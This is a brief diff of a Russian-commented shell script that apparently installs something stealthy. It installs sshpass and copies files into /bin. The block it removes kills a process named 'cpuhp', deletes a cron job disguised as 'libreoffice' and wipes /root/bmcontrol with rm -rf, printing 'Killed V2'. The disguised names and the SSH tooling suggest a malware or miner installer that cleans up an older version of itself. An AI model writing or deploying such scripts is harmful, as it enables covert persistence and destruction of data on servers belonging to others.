@@ -5,13 +5,6 @@ if [ -f /etc/cpuhp ]; then
     exit 1
 fi
 
-if [ -d "/root/bmcontrol" ]; then
-	killall cpuhp
- 	rm /etc/cron.d/libreoffice
-  	cd /root/bmcontrol
-   	rm -rf ./*
-        echo "Убит V2"
-fi
     apt-get update
     apt-get install -y sshpass
     echo "Копирую в /bin."
